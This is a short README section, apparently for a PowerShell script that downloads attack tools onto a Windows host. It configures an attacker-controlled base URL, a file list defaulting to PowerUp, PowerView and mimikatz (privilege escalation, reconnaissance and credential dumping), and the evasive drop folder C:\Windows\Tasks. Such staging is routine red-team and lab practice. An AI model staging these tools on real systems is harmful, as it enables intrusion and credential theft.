## Prerequisites
### Download Source
Change the url from:
```
$baseUrl = "http://192.168.1.2/"
```
To your own IP/Domain
```
$baseUrl = "http://Your-IP-Domain/"
```

### File List
Change Files from:
```
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
```
To your own files
```
$fileNames = @("PowerUp.ps1","whatever is in the directory")
```

### Download Location
Change from:
```
$downloadPath = "C:\Windows\Tasks"
```
To your own location 
```
$downloadPath = "C:\whereeveropsec"
```
